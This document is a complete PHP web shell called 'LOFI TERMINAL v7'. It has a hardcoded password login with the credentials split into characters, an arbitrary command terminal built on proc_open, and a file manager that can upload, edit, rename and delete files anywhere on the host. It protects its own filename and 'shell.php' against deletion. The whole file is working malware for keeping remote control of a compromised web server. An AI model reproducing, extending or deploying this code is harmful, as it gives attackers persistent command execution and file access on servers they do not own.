<?php
// ================================================================
// LOFI TERMINAL v7 - 100% PURE HTML (NO JAVASCRIPT NAVIGATION)
// ================================================================
// - Navigation using <a href="?p=..."> only
// - No javascript:void(0) for navigation
// - No AJAX, no blank page
// - proc_open only, anti-delete, Tailwind
// ================================================================

// --- KONFIGURASI (SPLIT) ---
$_u = 'a'.'d'.'m'.'i'.'n';
$_p = 's'.'a'.'d'.'b'.'o'.'y'; // GANTI
$_b = basename($_SERVER['PHP_SELF']);

// --- PROTECTED LIST (ANTI-DELETE) ---
$protected_files = [
    basename(__FILE__),
    'index.php',
    'shell.php',
    '.htaccess',
    'config.php',
    'wp-config.php',
];
$protected_dirs = [
    'bin', 'etc', 'proc', 'sys', 'root', 'var', 'usr', 'dev',
    'tmp', 'boot', 'lib', 'lib64', 'sbin', 'opt', 'home',
    'run', 'mnt', 'media', 'srv'
];

// --- CORE EXECUTION ENGINE (PROC_OPEN ONLY) ---
function _run($cmd) {
    $d = [
        0 => ['pipe', 'r'],
        1 => ['pipe', 'w'],
        2 => ['pipe', 'w']
    ];
    $shells = ['/bin/bash', '/bin/sh', '/bin/zsh'];
    $p = null;
    foreach ($shells as $sh) {
        if (file_exists($sh)) {
            $p = proc_open($sh, $d, $pipes, null, null, ['bypass_shell' => true]);
            if (is_resource($p)) break;
        }
    }
    if (!$p) {
        $p = proc_open('/bin/sh', $d, $pipes);
        if (!is_resource($p)) return '[ERROR] No shell';
    }
    fwrite($pipes[0], $cmd . "\n");
    fflush($pipes[0]);
    fclose($pipes[0]);
    $out = stream_get_contents($pipes[1]);
    $err = stream_get_contents($pipes[2]);
    fclose($pipes[1]);
    fclose($pipes[2]);
    proc_close($p);
    return $out ?: $err ?: '[NO OUTPUT]';
}

function _mkdir_cmd($p) { return _run('mkdir -p ' . escapeshellarg($p) . ' 2>&1'); }
function _rm_cmd($p) { return _run('rm -f ' . escapeshellarg($p) . ' 2>&1'); }
function _rmdir_cmd($p) { return _run('rmdir ' . escapeshellarg($p) . ' 2>&1'); }
function _mv_cmd($s, $d) { return _run('mv ' . escapeshellarg($s) . ' ' . escapeshellarg($d) . ' 2>&1'); }

function fs($b) {
    $u = ['B','KB','MB','GB','TB'];
    $b = max($b, 0);
    $p = floor(($b ? log($b) : 0) / log(1024));
    $p = min($p, count($u) - 1);
    $b /= pow(1024, $p);
    return round($b, 2) . ' ' . $u[$p];
}

function get_icon($n, $isd) {
    if ($isd) return 'fa-folder';
    $e = strtolower(pathinfo($n, PATHINFO_EXTENSION));
    $map = [
        'php' => 'fa-file-code', 'html' => 'fa-file-code', 'css' => 'fa-file-code',
        'js' => 'fa-file-code', 'json' => 'fa-file-code', 'xml' => 'fa-file-code',
        'jpg' => 'fa-file-image', 'jpeg' => 'fa-file-image', 'png' => 'fa-file-image',
        'gif' => 'fa-file-image', 'svg' => 'fa-file-image',
        'pdf' => 'fa-file-pdf', 'doc' => 'fa-file-word', 'docx' => 'fa-file-word',
        'xls' => 'fa-file-excel', 'xlsx' => 'fa-file-excel',
        'zip' => 'fa-file-archive', 'rar' => 'fa-file-archive', '7z' => 'fa-file-archive',
        'mp3' => 'fa-file-audio', 'wav' => 'fa-file-audio',
        'mp4' => 'fa-file-video', 'avi' => 'fa-file-video',
        'txt' => 'fa-file-alt', 'md' => 'fa-file-alt',
    ];
    return isset($map[$e]) ? $map[$e] : 'fa-file';
}

function dir_stats($p) {
    $f = 0; $d = 0; $s = 0;
    if (is_dir($p)) {
        $items = @scandir($p);
        if ($items) {
            foreach ($items as $item) {
                if ($item != '.' && $item != '..') {
                    $path = $p . '/' . $item;
                    if (is_dir($path)) $d++;
                    else { $f++; $s += @filesize($path); }
                }
            }
        }
    }
    return ['files' => $f, 'dirs' => $d, 'size' => $s];
}

// --- SESSION + LOGIN ---
session_start();
$err = '';

if (isset($_POST['action']) && $_POST['action'] === 'login') {
    if ($_POST['username'] === $_u && $_POST['password'] === $_p) {
        $_SESSION['is_logged_in'] = true;
        header('Location: ' . $_b);
        exit;
    } else $err = 'Access Denied.';
}

if (isset($_GET['action']) && $_GET['action'] === 'logout') {
    session_destroy();
    header('Location: ' . $_b);
    exit;
}

$logged = isset($_SESSION['is_logged_in']) && $_SESSION['is_logged_in'] === true;

if (!$logged) {
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Terminal Access</title>
<script src="https://cdn.tailwindcss.com"></script>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
<link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;700&display=swap" rel="stylesheet">
<style>
body{font-family:'Roboto Mono',monospace;background:linear-gradient(135deg,#0d1117,#1a1f2e);min-height:100vh;display:flex;align-items:center;justify-content:center;}
.box{backdrop-filter:blur(10px);background:rgba(22,27,34,0.8);border:1px solid rgba(187,154,248,0.3);padding:2rem;border-radius:1.5rem;max-width:400px;width:100%;}
.inp{background:#21262d;border:1px solid #bb9af8;border-left:4px solid #f7768e;color:#c9d1d9;padding:1rem;border-radius:0.75rem;width:100%;}
.inp:focus{outline:none;border-left-color:#bb9af8;box-shadow:0 0 15px rgba(187,154,248,0.4);}
.btn{background:linear-gradient(135deg,#f7768e,#bb9af8);color:#0d1117;font-weight:700;padding:1rem;border-radius:0.75rem;width:100%;border:none;transition:all 0.3s;}
.btn:hover{transform:translateY(-2px);box-shadow:0 6px 20px rgba(187,154,248,0.4);}
</style>
</head>
<body>
<div class="box">
<div class="text-center mb-8">
<div class="w-20 h-20 mx-auto mb-4 rounded-full bg-gradient-to-br from-[#f7768e] to-[#bb9af8] flex items-center justify-center">
<i class="fas fa-terminal text-3xl text-[#0d1117]"></i>
</div>
<h2 class="text-3xl font-bold text-[#bb9af8] uppercase tracking-widest">Access</h2>
</div>
<?php if ($err) echo '<div class="p-4 mb-4 bg-red-900/20 border border-red-500 rounded-xl text-red-400 text-center">'.$err.'</div>'; ?>
<form action="<?php echo $_b; ?>" method="POST">
<input type="hidden" name="action" value="login">
<input type="text" name="username" class="inp mb-4" placeholder="username" required>
<input type="password" name="password" class="inp mb-4" placeholder="password" required>
<button type="submit" class="btn"><i class="fas fa-sign-in-alt mr-2"></i>Login</button>
</form>
</div>
</body>
</html>
<?php exit; } ?>

<?php
// ================================================================
// FILE MANAGER - PURE GET NAVIGATION (NO JAVASCRIPT)
// ================================================================

// --- FUNGSI VALIDASI DIRECTORY ---
function getSafeDir($path) {
    if (empty($path) || $path === '/' || $path === '') {
        return '/';
    }
    $path = '/' . ltrim($path, '/');
    $path = preg_replace('/[^a-zA-Z0-9\/\-_\.]/', '', $path);
    $real = realpath($path);
    if ($real !== false && is_dir($real)) {
        return $real;
    }
    return getcwd();
}

// --- AMBIL CURRENT DIRECTORY DARI GET ---
$currentDir = getcwd();

if (isset($_GET['p'])) {
    $currentDir = getSafeDir($_GET['p']);
}

// --- PASTIKAN CURRENT DIR VALID ---
if (!is_dir($currentDir)) {
    $currentDir = getcwd();
}

// --- RELATIVE PATH UNTUK URL ---
$currentRel = ltrim($currentDir, '/');

// --- VARIABLE MESSAGES ---
$msg_s = '';
$msg_e = '';

// --- TERMINAL MODE (POST) ---
if (isset($_POST['action']) && $_POST['action'] === 'terminal') {
    $cmd = isset($_POST['cmd']) ? $_POST['cmd'] : '';
    echo '<pre style="background:#0d1117;color:#00ff41;padding:1rem;border-radius:0.5rem;font-family:monospace;white-space:pre-wrap;font-size:13px;">' . htmlspecialchars(_run($cmd)) . '</pre>';
    exit;
}

// --- ACTION HANDLER (FILE OPERATIONS - POST) ---
if (isset($_POST['action'])) {
    $act = $_POST['action'];
    
    try {
        switch ($act) {
            case 'create_dir':
                $n = trim($_POST['new_name']);
                if (empty($n)) throw new Exception('Name required.');
                $p = rtrim($currentDir, '/\\') . '/' . $n;
                if (file_exists($p)) throw new Exception('Exists.');
                $out = _mkdir_cmd($p);
                if (strpos($out, 'error') !== false || strpos($out, 'cannot') !== false) throw new Exception($out);
                $msg_s = 'Created: ' . htmlspecialchars($n);
                break;

            case 'create_file':
                $n = trim($_POST['new_name']);
                if (empty($n)) throw new Exception('Name required.');
                $p = rtrim($currentDir, '/\\') . '/' . $n;
                if (file_exists($p)) throw new Exception('Exists.');
                if (file_put_contents($p, '') === false) throw new Exception('Failed.');
                $msg_s = 'Created: ' . htmlspecialchars($n);
                break;

            case 'rename':
                $old = trim($_POST['old_name']);
                $new = trim($_POST['new_name']);
                if (empty($new)) throw new Exception('New name required.');
                $oldp = realpath($currentDir . '/' . $old);
                $newp = rtrim(dirname($oldp), '/\\') . '/' . $new;
                if ($oldp === false) throw new Exception('Not found.');
                if (in_array(basename($oldp), $protected_files) || in_array(basename($oldp), $protected_dirs)) {
                    throw new Exception('Protected item cannot be renamed.');
                }
                $out = _mv_cmd($oldp, $newp);
                if (strpos($out, 'error') !== false || strpos($out, 'cannot') !== false) throw new Exception($out);
                $msg_s = 'Renamed: ' . htmlspecialchars($old) . ' → ' . htmlspecialchars($new);
                break;

            case 'delete':
                $tgt = trim($_POST['target_name']);
                $tgtp = realpath($currentDir . '/' . $tgt);
                if ($tgtp === false) throw new Exception('Not found.');
                if (in_array(basename($tgtp), $protected_files)) {
                    throw new Exception('🔒 Protected file cannot be deleted.');
                }
                if (in_array(basename($tgtp), $protected_dirs)) {
                    throw new Exception('🔒 Protected system directory cannot be deleted.');
                }
                if ($tgtp === '/' || $tgtp === getcwd()) {
                    throw new Exception('🔒 Cannot delete root or current directory.');
                }
                if (is_dir($tgtp)) {
                    if (count(scandir($tgtp)) > 2) throw new Exception('Directory not empty.');
                    $out = _rmdir_cmd($tgtp);
                    if (strpos($out, 'error') !== false || strpos($out, 'cannot') !== false) throw new Exception($out);
                } else {
                    $out = _rm_cmd($tgtp);
                    if (strpos($out, 'error') !== false || strpos($out, 'cannot') !== false) throw new Exception($out);
                }
                $msg_s = 'Deleted: ' . htmlspecialchars($tgt);
                break;

            case 'edit_file':
                $fn = trim($_POST['file_name']);
                $content = $_POST['content'];
                $fp = realpath($currentDir . '/' . $fn);
                if (!is_file($fp)) throw new Exception('File not found.');
                if (file_put_contents($fp, $content) === false) throw new Exception('Failed to save.');
                $msg_s = 'Saved: ' . htmlspecialchars($fn);
                break;

            case 'upload':
                if (empty($_FILES['file_upload']['name'])) throw new Exception('No file.');
                $tmp = $_FILES['file_upload']['tmp_name'];
                $fn = basename($_FILES['file_upload']['name']);
                $target = $currentDir . '/' . $fn;
                if (file_exists($target)) throw new Exception('File exists.');
                if (!move_uploaded_file($tmp, $target)) throw new Exception('Upload failed.');
                $msg_s = 'Uploaded: ' . htmlspecialchars($fn);
                break;

            default:
                throw new Exception('Unknown action.');
        }
    } catch (Exception $e) {
        $msg_e = $e->getMessage();
    }
    // Redirect balik ke halaman yang sama dengan GET
    $rel = ltrim($currentDir, '/');
    header('Location: ' . $_b . '?p=' . urlencode($rel) . '&' . ($msg_s ? 'success=' . urlencode($msg_s) : 'error=' . urlencode($msg_e)));
    exit;
}

// --- EDITOR MODE ---
$edit_content = null;
$edit_filename = null;
if (isset($_GET['action']) && $_GET['action'] === 'edit' && isset($_GET['file'])) {
    $edit_filename = basename($_GET['file']);
    $edit_path = realpath($currentDir . '/' . $edit_filename);
    if (is_file($edit_path)) $edit_content = file_get_contents($edit_path);
    else { $msg_e = 'File not found.'; $edit_filename = null; }
}

if (isset($_GET['success'])) $msg_s = htmlspecialchars($_GET['success']);
if (isset($_GET['error'])) $msg_e = htmlspecialchars($_GET['error']);

// --- GET FILES ---
$files = [];
$stats = dir_stats($currentDir);
if (is_dir($currentDir) && $currentDir !== '/') {
    $ignore = ['.', '..', basename(__FILE__)];
    $items = array_diff(scandir($currentDir), $ignore);
    foreach ($items as $item) {
        $p = $currentDir . '/' . $item;
        $files[] = [
            'name' => $item,
            'is_dir' => is_dir($p),
            'size' => is_file($p) ? filesize($p) : 0,
            'modified' => filemtime($p),
            'icon' => get_icon($item, is_dir($p))
        ];
    }
    usort($files, function($a, $b) {
        if ($a['is_dir'] == $b['is_dir']) return strcasecmp($a['name'], $b['name']);
        return ($a['is_dir'] > $b['is_dir']) ? -1 : 1;
    });
}
?>

<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Terminal - <?php echo ($edit_content !== null) ? 'Editor' : 'Manager'; ?></title>
<script src="https://cdn.tailwindcss.com"></script>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
<link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;700&display=swap" rel="stylesheet">
<script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
<style>
body{font-family:'Roboto Mono',monospace;background:linear-gradient(135deg,#0d1117,#1a1f2e);color:#c9d1d9;padding:1rem;}
.card{background:rgba(28,33,40,0.8);backdrop-filter:blur(10px);border:1px solid #30363d;border-radius:1.5rem;padding:1.5rem;margin-bottom:1rem;}
.inp,.ta{background:#21262d;border:1px solid #30363d;border-left:3px solid #bb9af8;color:#c9d1d9;padding:0.75rem;border-radius:0.75rem;width:100%;}
.inp:focus,.ta:focus{outline:none;border-left-color:#f7768e;box-shadow:0 0 15px rgba(187,154,248,0.2);}
.ta{min-height:400px;font-family:monospace;font-size:0.875rem;}
.bg{background:linear-gradient(135deg,#f7768e,#bb9af8);color:#0d1117;font-weight:700;padding:0.75rem 1.5rem;border-radius:0.75rem;border:none;transition:all 0.3s;cursor:pointer;}
.bg:hover{transform:translateY(-2px);box-shadow:0 6px 20px rgba(187,154,248,0.4);}
.bo{background:transparent;border:1px solid #bb9af8;color:#bb9af8;padding:0.75rem 1.5rem;border-radius:0.75rem;transition:all 0.3s;cursor:pointer;}
.bo:hover{background:rgba(187,154,248,0.1);}
.bd{background:rgba(247,118,142,0.2);border:1px solid #f7768e;color:#f7768e;padding:0.75rem 1.5rem;border-radius:0.75rem;transition:all 0.3s;cursor:pointer;}
.bd:hover{background:#f7768e;color:#0d1117;}
.row{transition:all 0.2s;border-left:3px solid transparent;padding:0.75rem;border-radius:0.75rem;border:1px solid #30363d;margin-bottom:0.5rem;}
.row:hover{background:rgba(187,154,248,0.05);border-left-color:#bb9af8;}
.ico{width:40px;height:40px;display:flex;align-items:center;justify-content:center;border-radius:10px;background:rgba(187,154,248,0.1);color:#bb9af8;}
.ico.is-dir{background:rgba(247,118,142,0.1);color:#f7768e;}
.stat{background:linear-gradient(135deg,rgba(187,154,248,0.1),rgba(247,118,142,0.1));border:1px solid rgba(187,154,248,0.2);padding:1.5rem;border-radius:1.5rem;}
.folder-link{color:#bb9af8;font-weight:bold;text-decoration:none;}
.folder-link:hover{color:#f7768e;text-decoration:underline;}
.dir-nav{display:flex;flex-wrap:wrap;align-items:center;gap:2px;padding:0.5rem 0;}
.dir-nav a{color:#bb9af8;text-decoration:none;padding:0.2rem 0.5rem;border-radius:0.25rem;transition:all 0.2s;font-size:0.9rem;}
.dir-nav a:hover{background:rgba(187,154,248,0.2);color:#f7768e;}
.dir-nav .sep{color:#30363d;padding:0 2px;}
.dir-nav .current{color:#f7768e;padding:0.2rem 0.5rem;}
</style>
</head>
<body>
<div class="max-w-7xl mx-auto">

<?php if ($edit_content !== null) : ?>
<!-- EDITOR -->
<div class="card">
<div class="flex justify-between items-center mb-6">
<h2 class="text-2xl font-bold text-[#bb9af8]"><i class="fas fa-code mr-3"></i>Editor: <?php echo htmlspecialchars($edit_filename); ?></h2>
<a href="<?php echo $_b . '?p=' . urlencode($currentRel); ?>" class="bo"><i class="fas fa-arrow-left mr-2"></i>Back</a>
</div>
<form action="<?php echo $_b; ?>" method="POST">
<input type="hidden" name="action" value="edit_file">
<input type="hidden" name="file_name" value="<?php echo htmlspecialchars($edit_filename); ?>">
<textarea name="content" class="ta"><?php echo htmlspecialchars($edit_content); ?></textarea>
<button type="submit" class="bg mt-4"><i class="fas fa-save mr-2"></i>Save</button>
</form>
</div>
<?php else : ?>

<!-- HEADER -->
<div class="card">
<div class="flex justify-between items-center">
<div>
<h1 class="text-3xl font-bold bg-gradient-to-r from-[#f7768e] to-[#bb9af8] bg-clip-text text-transparent">
<i class="fas fa-terminal mr-3"></i>Terminal
</h1>
<p class="text-sm text-lofi-text/60">CWD: <?php echo htmlspecialchars($currentDir); ?></p>
</div>
<a href="<?php echo $_b . '?action=logout'; ?>" class="bd"><i class="fas fa-power-off mr-2"></i>Logout</a>
</div>
</div>

<!-- STATS -->
<div class="grid grid-cols-1 sm:grid-cols-3 gap-4 mb-4">
<div class="stat"><i class="fas fa-folder text-[#bb9af8] mr-2"></i> Dirs: <?php echo $stats['dirs']; ?></div>
<div class="stat"><i class="fas fa-file text-[#f7768e] mr-2"></i> Files: <?php echo $stats['files']; ?></div>
<div class="stat"><i class="fas fa-hdd text-[#58a6ff] mr-2"></i> Size: <?php echo fs($stats['size']); ?></div>
</div>

<!-- BREADCRUMB NAVIGATION (PURE HTML - NO JAVASCRIPT) -->
<div class="card">
<div class="dir-nav">
<?php
$pathParts = explode("/", ltrim($currentDir, '/'));
echo '<i class="fas fa-folder-open text-[#bb9af8] mr-2"></i>';
echo '<a href="' . $_b . '" class="font-bold">/</a>';
echo '<span class="sep">/</span>';

$buildPath = '';
foreach ($pathParts as $v) {
    if ($v == "") continue;
    $buildPath .= '/' . $v;
    echo '<a href="' . $_b . '?p=' . urlencode(ltrim($buildPath, '/')) . '">' . htmlspecialchars($v) . '</a>';
    echo '<span class="sep">/</span>';
}
?>
</div>
</div>

<!-- MESSAGES -->
<?php if ($msg_s) echo '<div class="p-4 mb-4 bg-green-900/20 border border-green-500 rounded-xl text-green-400">✅ '.$msg_s.'</div>'; ?>
<?php if ($msg_e) echo '<div class="p-4 mb-4 bg-red-900/20 border border-red-500 rounded-xl text-red-400">❌ '.$msg_e.'</div>'; ?>

<!-- ACTIONS -->
<div class="card">
<div class="grid grid-cols-2 sm:grid-cols-5 gap-3">
<button onclick="showCreateModal('file')" class="bo"><i class="fas fa-file-plus mr-2"></i>File</button>
<button onclick="showCreateModal('dir')" class="bo"><i class="fas fa-folder-plus mr-2"></i>Dir</button>
<button onclick="showUploadModal()" class="bg"><i class="fas fa-upload mr-2"></i>Upload</button>
<button onclick="showTerminalModal()" class="bo"><i class="fas fa-terminal mr-2"></i>Terminal</button>
<a href="<?php echo $_b . '?p=' . urlencode($currentRel); ?>" class="bo text-center py-3"><i class="fas fa-sync-alt mr-2"></i>Refresh</a>
</div>
</div>

<!-- FILES -->
<div class="card">
<div class="space-y-2">

<?php if ($currentDir !== '/'): ?>
<div class="row flex items-center gap-4">
<div class="ico"><i class="fas fa-level-up-alt"></i></div>
<a href="<?php echo $_b . '?p=' . urlencode(ltrim(dirname($currentDir), '/')); ?>" class="flex-1 font-bold text-lofi-text/80">.. [Parent]</a>
</div>
<?php endif; ?>

<?php foreach ($files as $file): ?>
<div class="row flex flex-col sm:flex-row items-start sm:items-center gap-4">
<div class="ico <?php echo $file['is_dir'] ? 'is-dir' : ''; ?>">
<i class="fas <?php echo $file['icon']; ?>"></i>
</div>
<div class="flex-1">
<?php if ($file['is_dir']): ?>
<a href="<?php echo $_b . '?p=' . urlencode(ltrim($currentDir . '/' . $file['name'], '/')); ?>" class="folder-link">
<?php echo htmlspecialchars($file['name']); ?>
</a>
<?php else: ?>
<span class="font-bold"><?php echo htmlspecialchars($file['name']); ?></span>
<span class="text-xs text-lofi-text/50 ml-2"><?php echo fs($file['size']); ?></span>
<?php endif; ?>
</div>
<div class="flex gap-2">
<button onclick="showRenameModal('<?php echo addslashes($file['name']); ?>')" class="bo text-xs px-3 py-1"><i class="fas fa-edit"></i></button>
<?php if (!$file['is_dir']): ?>
<a href="<?php echo $_b . '?action=edit&file=' . urlencode($file['name']) . '&p=' . urlencode($currentRel); ?>" class="bg text-xs px-3 py-1"><i class="fas fa-code"></i></a>
<?php endif; ?>
<button onclick="showDeleteConfirm('<?php echo addslashes($file['name']); ?>')" class="bd text-xs px-3 py-1"><i class="fas fa-trash"></i></button>
</div>
</div>
<?php endforeach; ?>

<?php if (empty($files)): ?>
<div class="text-center py-8 text-lofi-text/40">
<i class="fas fa-folder-open text-4xl mb-3"></i>
<p>Empty directory</p>
</div>
<?php endif; ?>

</div>
</div>

<?php endif; ?>
</div>

<!-- ============================================================ -->
<!-- JAVASCRIPT (ONLY FOR MODALS - NO NAVIGATION)                -->
<!-- ============================================================ -->
<script>
// --- CREATE MODAL ---
function showCreateModal(type) {
    const action = type === 'dir' ? 'create_dir' : 'create_file';
    const title = type === 'dir' ? 'New Directory' : 'New File';
    Swal.fire({
        title: title,
        html: `<form id="cf" action="<?php echo $_b; ?>" method="POST">
            <input type="hidden" name="action" value="${action}">
            <input type="text" id="nname" name="new_name" class="inp mt-4" placeholder="Name..." required>
        </form>`,
        showCancelButton: true,
        confirmButtonText: 'Create',
        cancelButtonText: 'Cancel',
        preConfirm: () => { if (!$('#nname').val()) { Swal.showValidationMessage('Required'); return false; } return true; }
    }).then(r => { if (r.isConfirmed) $('#cf').submit(); });
}

// --- RENAME MODAL ---
function showRenameModal(old) {
    Swal.fire({
        title: 'Rename',
        html: `<form id="rf" action="<?php echo $_b; ?>" method="POST">
            <input type="hidden" name="action" value="rename">
            <input type="hidden" name="old_name" value="${old}">
            <input type="text" id="nname" name="new_name" class="inp mt-4" value="${old}" required>
        </form>`,
        showCancelButton: true,
        confirmButtonText: 'Rename',
        cancelButtonText: 'Cancel',
        preConfirm: () => { if (!$('#nname').val()) { Swal.showValidationMessage('Required'); return false; } return true; }
    }).then(r => { if (r.isConfirmed) $('#rf').submit(); });
}

// --- DELETE MODAL ---
function showDeleteConfirm(target) {
    Swal.fire({
        title: '⚠️ Delete?',
        text: target,
        icon: 'warning',
        showCancelButton: true,
        confirmButtonText: 'Delete',
        cancelButtonText: 'Cancel',
        customClass: { confirmButton: 'bd', cancelButton: 'bo' }
    }).then(r => {
        if (r.isConfirmed) {
            const form = $('<form action="<?php echo $_b; ?>" method="POST"></form>');
            form.append('<input type="hidden" name="action" value="delete">');
            form.append('<input type="hidden" name="target_name" value="' + target + '">');
            $('body').append(form);
            form.submit();
        }
    });
}

// --- UPLOAD MODAL ---
function showUploadModal() {
    Swal.fire({
        title: 'Upload',
        html: `<form id="uf" action="<?php echo $_b; ?>" method="POST" enctype="multipart/form-data">
            <input type="hidden" name="action" value="upload">
            <input type="file" name="file_upload" class="mt-4" required>
        </form>`,
        showCancelButton: true,
        confirmButtonText: 'Upload',
        cancelButtonText: 'Cancel',
        preConfirm: () => { if (!$('input[name="file_upload"]')[0].files.length) { Swal.showValidationMessage('Select file'); return false; } return true; }
    }).then(r => { if (r.isConfirmed) $('#uf').submit(); });
}

// --- TERMINAL MODAL ---
function showTerminalModal() {
    Swal.fire({
        title: '<i class="fas fa-terminal mr-2"></i>Terminal (proc_open)',
        html: `<div id="termOut" style="background:#0d1117;color:#00ff41;padding:1rem;border-radius:0.5rem;font-family:monospace;height:300px;overflow:auto;white-space:pre-wrap;text-align:left;font-size:13px;">[Ready]</div>
            <div class="mt-3 flex gap-2">
                <input type="text" id="termCmd" class="inp flex-1" placeholder="command..." autofocus>
                <button id="termBtn" class="bg">Run</button>
            </div>
            <button id="termClear" class="bo mt-2 text-sm w-full">Clear</button>`,
        showConfirmButton: false,
        showCancelButton: true,
        cancelButtonText: 'Close',
        didOpen: () => {
            const out = document.getElementById('termOut');
            const cmd = document.getElementById('termCmd');
            const btn = document.getElementById('termBtn');
            const clear = document.getElementById('termClear');
            
            function run() {
                const c = cmd.value.trim();
                if (!c) return;
                out.textContent += '\n$ ' + c + '\n';
                out.scrollTop = out.scrollHeight;
                cmd.value = '';
                $.post('<?php echo $_b; ?>', { action: 'terminal', cmd: c }, function(data) {
                    out.textContent += data + '\n';
                    out.scrollTop = out.scrollHeight;
                });
            }
            
            btn.onclick = run;
            cmd.addEventListener('keydown', e => { if (e.key === 'Enter') { e.preventDefault(); run(); } });
            clear.onclick = () => { out.textContent = '[Cleared]'; };
            setTimeout(() => cmd.focus(), 300);
        }
    });
}
</script>

</body>
</html>